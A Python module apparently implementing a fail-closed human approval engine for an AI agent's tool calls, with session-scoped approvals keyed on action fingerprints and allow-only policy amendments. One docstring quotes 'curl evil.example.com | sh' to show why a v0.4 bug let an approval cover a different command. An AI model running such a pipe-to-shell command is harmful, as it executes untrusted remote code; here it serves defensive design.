"""Approval outcomes that write back policy.

Borrowed from Codex, `codex-rs/protocol/src/protocol.rs`, ``pub enum ReviewDecision``:

    Approved
    ApprovedExecpolicyAmendment { proposed_execpolicy_amendment }
    ApprovedForSession
    ApprovedMcpPolicyAmendment
    NetworkPolicyAmendment { network_policy_amendment }
    Denied { rejection }
    TimedOut
    Abort

The idea that transfers: a human decision is not only a yes/no on one call. It may carry an
*amendment* — a new rule — so the same question is not asked again, scoped to the session or
persisted. A governed system that re-asks the identical question forever trains its user to
click "yes" without reading, which is the opposite of governance.

Two constraints psh adds, both from the authority lattice:

* An amendment may only add ``allow`` rules. It cannot add ``forbidden`` (that is policy
  authoring, not approval) and it cannot remove anything. Because evaluation is
  forbidden → prompt → allow with first match winning (Claude Code's order), an added
  ``allow`` never overrides an existing ``forbidden`` — the amendment can widen only within the
  space the policy already left open.
* An amendment cannot grant beyond the run envelope. A session amendment lives as long as the
  envelope; a persisted one is written to the policy file and is itself an event.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Mapping, Sequence

from ..contracts import (
    ApprovalDenied, ApprovalRequired, PolicyDenied, RunEnvelope, content_hash, new_id,
)
from .execpolicy import Decision, ExecPolicy, PrefixRule

__all__ = ["ApprovalKind", "PolicyAmendment", "ApprovalOutcome", "AmendingApprovalEngine",
           "ApprovalRequest"]


@dataclass(frozen=True, slots=True)
class ApprovalRequest:
    """What a human is actually being asked to approve.

    A session approval must be keyed on the *action*, not on the tool. v0.4 keyed it on the
    human-readable string the broker happened to build — ``"run shell"`` — so approving

        shell: git push origin main            -> APPROVED_FOR_SESSION

    also pre-approved

        shell: curl evil.example.com | sh

    for the rest of the run, because both produced the same string. A reviewer confirmed it:
    two different shell operations, one approval prompt. Approving a tool is not approving
    an action.

    So the session key is a digest over the dimensions that make two requests the same
    question: the kind of request, the component, the normalised action (argv tokens for a
    command, a payload digest otherwise), the resources it touches, and the risk tier. Any
    difference in any of them is a new question.
    """

    kind: str                                   # tool_call | write | delegation | release | hook_ask
    component: str = ""
    action: tuple[str, ...] = ()
    targets: tuple[str, ...] = ()
    risk: str = ""
    summary: str = ""
    detail: Mapping[str, Any] = field(default_factory=dict)

    @classmethod
    def opaque(cls, what: str) -> "ApprovalRequest":
        """A request that carries only its human-readable text.

        The compatibility shape for callers that pass a bare string. It keys on that string,
        which is the v0.4 behaviour — kept working, but never produced by the broker, which
        always describes the action it is asking about.
        """
        return cls(kind="opaque", summary=what, action=(what,))

    def fingerprint(self) -> str:
        return content_hash({"kind": self.kind, "component": self.component,
                             "action": list(self.action), "targets": sorted(self.targets),
                             "risk": self.risk})

    def session_key(self, run_id: str) -> tuple[str, str]:
        """Session approvals never outlive the run that granted them."""
        return (run_id, self.fingerprint())

    def describe(self) -> str:
        if self.summary:
            return self.summary
        body = " ".join(self.action) or self.component
        return f"{self.kind}: {body}"[:200]

    def as_record(self) -> dict[str, Any]:
        return {"kind": self.kind, "component": self.component,
                "action": list(self.action), "targets": list(self.targets),
                "risk": self.risk, "fingerprint": self.fingerprint(),
                **dict(self.detail)}


class ApprovalKind(str, Enum):
    APPROVED = "approved"
    APPROVED_FOR_SESSION = "approved_for_session"
    APPROVED_WITH_AMENDMENT = "approved_with_amendment"
    DENIED = "denied"
    TIMED_OUT = "timed_out"
    ABORT = "abort"


@dataclass(frozen=True, slots=True)
class PolicyAmendment:
    """A proposed new ``allow`` rule, attached to an approval."""

    pattern: tuple[Any, ...]
    justification: str
    persist: bool = False
    #: Examples the rule must match/not match — the self-test travels with the amendment.
    match: tuple[tuple[str, ...], ...] = ()
    not_match: tuple[tuple[str, ...], ...] = ()

    def to_rule(self, *, origin: str) -> PrefixRule:
        # Decision is fixed: an amendment can only ever ADD permission within what the
        # existing forbidden rules leave open.
        return PrefixRule(tuple(self.pattern), Decision.ALLOW, self.justification,
                          match=self.match, not_match=self.not_match, origin=origin)


@dataclass(frozen=True, slots=True)
class ApprovalOutcome:
    kind: ApprovalKind
    rejection: str = ""
    amendment: PolicyAmendment | None = None
    id: str = field(default_factory=lambda: new_id("apr"))
    at: float = field(default_factory=time.time)

    @property
    def approved(self) -> bool:
        return self.kind in (ApprovalKind.APPROVED, ApprovalKind.APPROVED_FOR_SESSION,
                             ApprovalKind.APPROVED_WITH_AMENDMENT)


Handler = Callable[[str, Mapping[str, Any]], "bool | ApprovalOutcome"]


class AmendingApprovalEngine:
    """Human-in-the-loop decisions that may amend policy. Fails closed without a handler.

    Drop-in for the v0.3 ``ApprovalEngine``: a handler returning a plain ``bool`` still works.
    A handler returning an ``ApprovalOutcome`` may additionally approve for the session or
    attach an amendment.
    """

    def __init__(self, handler: Handler | None = None, *, policy: ExecPolicy | None = None,
                 audit: Callable[..., Any] | None = None,
                 persist: Callable[[ExecPolicy], None] | None = None) -> None:
        self.handler = handler
        self.policy = policy
        self._audit = audit
        self._persist = persist
        self.requests: list[dict[str, Any]] = []
        #: Session-scoped approvals: (run_id, what) pairs already approved for the session.
        self._session_approved: set[tuple[str, str]] = set()
        self.amendments_applied = 0

    def _emit(self, event: str, **detail: Any) -> None:
        if self._audit is not None:
            self._audit(event, **detail)

    def request(self, what: "str | ApprovalRequest", envelope: RunEnvelope,
                **detail: Any) -> ApprovalOutcome:
        """Return an approval outcome or raise. Every request is recorded either way.

        ``what`` is an :class:`ApprovalRequest` describing the action, or a bare string for
        callers predating it. The session cache is keyed on the request's fingerprint, so a
        session approval covers the action that was approved and nothing else.
        """
        request = what if isinstance(what, ApprovalRequest) else ApprovalRequest.opaque(str(what))
        what = request.describe()
        key = request.session_key(envelope.run_id)
        if key in self._session_approved:
            self._emit("approval_cached", what=what, run_id=envelope.run_id,
                       fingerprint=key[1][:16])
            return ApprovalOutcome(ApprovalKind.APPROVED_FOR_SESSION)

        record = {"what": what, "run_id": envelope.run_id, "risk": envelope.risk.name,
                  **request.as_record(), **detail}
        self.requests.append(record)
        self._emit("approval_requested", what=what, risk=envelope.risk.name,
                   fingerprint=key[1][:16], kind=request.kind, component=request.component)

        if self.handler is None:
            raise ApprovalRequired(
                f"{what} requires human approval and no approval handler is configured; "
                "failing closed")

        raw = self.handler(what, record)
        outcome = (ApprovalOutcome(ApprovalKind.APPROVED if raw else ApprovalKind.DENIED)
                   if isinstance(raw, bool) else raw)

        if not outcome.approved:
            self._emit("approval_denied", what=what, kind=outcome.kind.value)
            if outcome.kind is ApprovalKind.ABORT:
                raise ApprovalDenied(f"a human aborted the run at: {what}")
            raise ApprovalDenied(f"a human refused: {what}"
                                 + (f" — {outcome.rejection}" if outcome.rejection else ""))

        if outcome.kind is ApprovalKind.APPROVED_FOR_SESSION:
            self._session_approved.add(key)
        if outcome.amendment is not None:
            self._apply_amendment(outcome.amendment, envelope, what)

        self._emit("approval_granted", what=what, kind=outcome.kind.value,
                   amended=outcome.amendment is not None)
        return outcome

    def _apply_amendment(self, amendment: PolicyAmendment, envelope: RunEnvelope,
                         what: str) -> None:
        if self.policy is None:
            raise PolicyDenied("an amendment was proposed but no execution policy is attached")
        origin = f"amendment:{'persisted' if amendment.persist else envelope.run_id}"
        rule = amendment.to_rule(origin=origin)  # self-tests run here; a bad rule raises

        # The amendment must not override a forbidden rule. It cannot by construction
        # (evaluation order), but an amendment whose OWN examples are forbidden is a
        # confused or hostile proposal, and we refuse it outright rather than accept a rule
        # that silently never fires.
        for example in rule.match:
            existing = self.policy.evaluate(example)
            if existing.decision is Decision.FORBIDDEN:
                self._emit("amendment_refused", what=what, reason="conflicts with forbidden rule",
                           rule=rule.render())
                raise PolicyDenied(
                    f"amendment [{rule.render()}] would allow {list(example)!r}, which a "
                    f"forbidden rule refuses: {existing.justification}")

        self.policy.add_rule(rule)
        self.amendments_applied += 1
        self._emit("policy_amended", what=what, rule=rule.render(),
                   persist=amendment.persist, origin=origin, run_id=envelope.run_id)
        if amendment.persist and self._persist is not None:
            self._persist(self.policy)

    def expire_session(self, run_id: str) -> int:
        """Drop session-scoped approvals and rules when a run ends. Returns rules removed."""
        self._session_approved = {k for k in self._session_approved if k[0] != run_id}
        if self.policy is None:
            return 0
        before = len(self.policy.rules)
        self.policy.rules = [r for r in self.policy.rules
                             if r.origin != f"amendment:{run_id}"]
        removed = before - len(self.policy.rules)
        if removed:
            self._emit("session_amendments_expired", run_id=run_id, removed=removed)
        return removed
